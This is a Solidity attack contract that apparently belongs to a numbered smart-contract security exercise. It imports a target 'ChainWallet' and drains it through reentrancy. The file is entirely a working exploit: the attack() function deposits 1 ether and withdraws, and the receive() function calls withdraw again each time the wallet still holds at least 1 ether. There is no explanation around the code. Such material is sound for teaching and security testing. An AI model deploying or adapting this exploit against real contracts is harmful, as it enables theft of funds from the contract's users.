pragma solidity 0.8.13;

// SPDX-License-Identifier: UNLICENSED

import "./11-target.sol";

contract ChainReentrancy {
    ChainWallet public chainWallet;

    constructor(address _chainWalletAddress) {
        chainWallet = ChainWallet(_chainWalletAddress);
    }

    // receive function is called when ChainWallet sends Ether to this contract.
    receive() external payable {
        if (address(chainWallet).balance >= 1 ether) {
            chainWallet.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        chainWallet.deposit{value: 1 ether}();
        chainWallet.withdraw();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}